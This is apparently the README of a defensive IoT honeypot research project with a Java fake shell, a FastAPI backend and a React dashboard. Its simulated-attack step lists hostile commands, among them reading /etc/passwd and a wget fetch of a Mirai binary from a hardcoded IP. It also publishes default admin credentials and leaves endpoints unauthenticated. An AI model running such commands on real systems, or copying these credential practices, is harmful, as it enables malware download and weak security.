# HoneyShield — IoT Honeypot Security Operations Platform

> A full-stack, real-time IoT honeypot platform that captures, analyzes, and visualizes live cyberattacks targeting Internet-of-Things devices.

---

## Overview

**HoneyShield** is an end-to-end cybersecurity research platform built to simulate vulnerable IoT devices (routers, IP cameras, door locks) and capture real attack traffic from the internet. Every SSH login attempt, brute-force credential spray, shell command, and exploit attempt is logged, relayed to a backend API, and displayed live on a professional SOC (Security Operations Center) dashboard.

| Layer | Technology | Purpose |
|---|---|---|
| Java Honeypot Engine | Java 17, Apache MINA SSHD | Simulates real IoT device SSH/HTTP/RTSP services |
| FastAPI Backend | Python 3.11, FastAPI, PostgreSQL | Receives and stores all attack telemetry |
| React SOC Dashboard | React 18, TypeScript, Vite | Visualizes live attacks in real time |

---

## System Architecture

```
INTERNET / LAN (Real or Simulated Attackers)
           |
           | SSH / HTTP / RTSP attacks
           v
+--------------------------------------------------+
|        Java Honeypot Engine (Port 2222)          |
|  - Accepts ALL SSH connections (any password)    |
|  - Presents a fake BusyBox IoT shell             |
|  - Records every credential pair and command     |
|  - ApiRelay -> sends events to FastAPI (HTTP/1.1)|
+--------------------------------------------------+
           |
           | POST /api/v1/events/{id}/events
           v
+--------------------------------------------------+
|        FastAPI Backend (Port 8000)               |
|  - Ingests events (no auth required)             |
|  - Stores events in PostgreSQL                   |
|  - Serves REST API for dashboard                 |
|  - Public: GET /api/v1/events/recent             |
+--------------------------------------------------+
           |
           | JSON polling every 3 seconds
           v
+--------------------------------------------------+
|        React SOC Dashboard (Port 5173)           |
|  - Real-Time Attack Telemetry Feed               |
|  - Protocol breakdown charts                     |
|  - Alert management and threat intelligence      |
+--------------------------------------------------+
```

---

## Key Features

### Java Honeypot Engine
- **Multi-Protocol Deception**: SSH (port 2222), HTTP web admin panel (port 8080), RTSP stub (port 554)
- **Realistic IoT Personas**: Mimics Hikvision cameras, MikroTik routers, door-lock controllers
- **Fake BusyBox Shell**: Fully interactive fake shell with canned responses for uname, ifconfig, cat, wget, ls
- **Credential Harvesting**: Captures every username and password attempt in real time
- **Live API Relay**: Asynchronously forwards events to FastAPI via HTTP/1.1 without blocking the SSH session
- **DoS Hardening**: 50 global sessions max (3 per IP), idle timeouts, input sanitization

### FastAPI Backend
- **Event Ingest API**: Public POST /{honeypot_id}/events endpoint
- **Live Feed API**: Public GET /events/recent — last 100 events, no auth required
- **PostgreSQL Storage**: Full metadata — IP, port, protocol, payload, timestamp
- **JWT Authentication**: Role-based access (admin, analyst)
- **Auto-Provisioning**: Unknown honeypot IDs auto-registered on first event

### React SOC Dashboard
- **Real-Time Attack Stream**: Polls backend every 3 seconds
- **Protocol Filters**: Filter by SSH, HTTP, MQTT, RTSP
- **Severity Badges**: LOW / MEDIUM / HIGH / CRITICAL
- **Payload Intelligence**: Credentials, shell commands, exploit CVEs, malware URLs
- **Dark Mode SOC UI**: Professional glassmorphism design

---

## Project Structure

```
iot-honeypot/
+-- src/main/java/com/security/honeypot/
|   +-- HoneypotServer.java       # Main server startup (SSH/HTTP/RTSP)
|   +-- FakeShellFactory.java     # Fake BusyBox interactive shell
|   +-- DatabaseManager.java      # SQLite logging + API relay hook
|   +-- ApiRelay.java             # HTTP/1.1 async event forwarder
|   +-- HttpHoneypot.java         # Fake IoT web admin panel (port 8080)
|   +-- RtspStub.java             # Fake RTSP camera stub (port 554)
|   +-- DeviceProfile.java        # IoT device persona definitions
|   +-- Sanitizer.java            # Input sanitization and hardening
|
+-- backend/
|   +-- app/
|   |   +-- api/v1/
|   |   |   +-- events.py         # Ingest + live feed endpoints
|   |   |   +-- honeypots.py      # Honeypot CRUD
|   |   |   +-- alerts.py         # Alert management
|   |   |   +-- auth.py           # JWT login/refresh
|   |   |   +-- dashboard.py      # Analytics endpoints
|   |   |   +-- health.py         # Health check
|   |   +-- db/models/honeypot.py # SQLAlchemy ORM models
|   |   +-- services/honeypot_service.py  # Business logic
|   +-- seed_admin.py             # Creates default admin user
|   +-- seed_mock_data.py         # Seeds background attack data
|   +-- docker-compose.dev.yml    # PostgreSQL for local dev
|
+-- frontend/src/honeyshield/
|   +-- section/LiveAttackFeed.tsx   # Real-time telemetry component
|   +-- page/LoginPage.tsx           # Admin login page
|   +-- lib/soc-api.ts               # FastAPI client
|   +-- lib/backend-context.tsx      # Global state + polling loop
|
+-- target/iot-honeypot.jar       # Compiled runnable JAR
+-- pom.xml                       # Maven build configuration
```

---

## Running the Platform

### Prerequisites
- Java 17+
- Python 3.11+
- Node.js 18+
- Docker Desktop (for PostgreSQL)

### Step 1 — Start Backend

Open PowerShell Window 1:

```powershell
cd d:\HoneyPot-main\iot-honeypot\backend
docker compose -f docker-compose.dev.yml up -d
python -m alembic upgrade head
python seed_admin.py
python seed_mock_data.py
python -m uvicorn app.main:app --host 0.0.0.0 --port 8000 --reload
```

Backend API: http://localhost:8000/docs

### Step 2 — Start Dashboard

Open PowerShell Window 2:

```powershell
cd d:\HoneyPot-main\iot-honeypot\frontend
npm install
npm run dev
```

Dashboard: http://localhost:5173
Login: admin / Admin@1234!

### Step 3 — Start Java Honeypot

Open PowerShell Window 3:

```powershell
cd d:\HoneyPot-main\iot-honeypot
java -jar target/iot-honeypot.jar
```

SSH Honeypot listening on: 0.0.0.0:2222

### Step 4 — Simulate an Attack

Open PowerShell Window 4:

```powershell
ssh -p 2222 root@localhost
```

At the password prompt, press ENTER (any password is accepted).
Then run commands in the fake shell:

```bash
uname -a
cat /etc/passwd
ifconfig
wget http://45.14.2.1/mirai.x86
```

Each command appears LIVE on the dashboard within 3 seconds!

---

## Default Credentials

| Service | Username | Password |
|---|---|---|
| SOC Dashboard | admin | Admin@1234! |
| Backend API (/docs) | admin | Admin@1234! |
| SSH Honeypot | any | any (all accepted) |

---

## API Reference

| Method | Endpoint | Auth | Description |
|---|---|---|---|
| POST | /api/v1/auth/login | None | Get JWT token |
| GET | /api/v1/events/recent | None | Live attack feed (last 100) |
| POST | /api/v1/events/{id}/events | None | Ingest honeypot event |
| GET | /api/v1/honeypots | Admin | List all honeypot sensors |
| GET | /api/v1/alerts | Analyst | List security alerts |
| GET | /api/v1/analytics/stats | Analyst | Attack statistics |
| GET | /api/v1/health | None | Backend health check |

---

## How the Live Telemetry Pipeline Works

```
1. Attacker types "uname -a" in SSH shell
2. FakeShellFactory.java captures the command
3. DatabaseManager.logCommand() is called
   -> SQLite local DB write (honeypot.db)
   -> ApiRelay.sendCommandEvent()
       -> HTTP POST (HTTP/1.1) to FastAPI:
          POST http://localhost:8000/api/v1/events/{hpId}/events
          Body: {"event_type":"command","protocol":"ssh",
                 "src_ip":"X.X.X.X","payload":{"command":"uname -a"}}
       -> FastAPI stores event in PostgreSQL
4. React dashboard polls /events/recent every 3 seconds
5. LiveAttackFeed.tsx renders new row at top of feed
```

---

## Rebuilding the Java JAR

```powershell
cd d:\HoneyPot-main\iot-honeypot

# Recompile ApiRelay
javac --release 17 -cp "target/extracted" -d target/classes `
  src/main/java/com/security/honeypot/ApiRelay.java

# Update the JAR
jar uf target/iot-honeypot.jar -C target/classes `
  com/security/honeypot/ApiRelay.class

# Full Maven rebuild
.\mvnw clean package -DskipTests
```

---

## Security Design Principles

1. **Isolation**: The honeypot never executes attacker commands — all responses are pre-canned
2. **Input Sanitization**: Attacker input is scrubbed of ANSI escapes, null bytes, and path traversal sequences
3. **Resource Limits**: Max 50 SSH sessions (3 per IP), 30-second idle timeout
4. **No Reflection**: Java exceptions and class names are never exposed to attackers
5. **Async Relay**: Event forwarding is non-blocking — a slow backend never crashes the honeypot

---

## Use Cases

- **Academic Research**: Capture and study real-world IoT attack patterns
- **Threat Intelligence**: Build datasets of attacker IPs, credentials, and malware URLs
- **Security Demonstrations**: Live showcase of cyberattack detection
- **Student Training**: Hands-on SOC analyst experience with real attack data

---

## Tech Stack

| Component | Technology |
|---|---|
| Honeypot Engine | Java 17, Apache MINA SSHD 2.12, BouncyCastle, SQLite |
| Backend | Python 3.11, FastAPI, SQLAlchemy, Alembic, PostgreSQL, JWT |
| Frontend | React 18, TypeScript, Vite, Axios |
| Infrastructure | Docker, Docker Compose |
| Build | Maven (Java), pip (Python), npm (Node) |

---

*Built for cybersecurity research and educational demonstration purposes.*
